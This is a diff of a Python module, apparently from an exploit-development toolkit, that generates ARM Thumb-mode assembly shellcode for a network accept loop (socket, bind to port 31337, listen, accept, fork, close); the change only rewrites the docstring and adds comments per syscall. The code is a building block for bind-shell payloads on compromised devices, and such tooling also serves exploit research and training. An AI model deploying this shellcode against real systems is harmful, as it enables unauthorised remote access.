@@ -1,18 +1,17 @@
-# acceptloop(port)
-
 import socket
 
 def generate(port=31337):
     """accept loop shellcode in Thumb Mode
     
-    argument:
-        port (int/str): specific port
+    Args:
+        port(int/str): specific port
 
-    return:
-        shellcode string in .s style
+    Returns:
+        ``r6`` reg indicates socket descriptor will be mapped with dup()
     """
 
     sc = '''
+    /* socket(...) */
     mov r0, #2
     mov r1, #1
     sub r2, r2, r2
@@ -21,6 +20,7 @@ def generate(port=31337):
     add r7, r7, #26
     svc 1
 
+    /* bind(...) */
     mov r6, r0
     mov r4, pc
     add r4, #22
@@ -41,6 +41,7 @@ sockaddr_in_1:
     .short 2
     .short %s
 
+    /* listen(...) */
 after_sockaddr_in_5:
     mov r1, #16
     mov r0, r6
@@ -49,6 +50,7 @@ after_sockaddr_in_5:
     add r7, r7, #29
     svc 1
 
+    /* accept(...) */
 looplabel_2:
     mov r0, r6
     sub r1, r1, r1
@@ -57,12 +59,14 @@ looplabel_2:
     add r7, r7, #255
     add r7, r7, #30
     svc 1
+    /* fork(...) */
     mov r5, r0
     mov r7, #2
     svc 1
     cmp r0, #0
     bgt cleanup_3
 
+    /* child close(...) */
     mov r0, r6
     mov r7, #6
     svc 1
@@ -70,6 +74,7 @@ looplabel_2:
     mov r0, r5
     b after_fork_4
 
+    /* parent close() */
 cleanup_3:
     mov r0, r5
     mov r7, #6
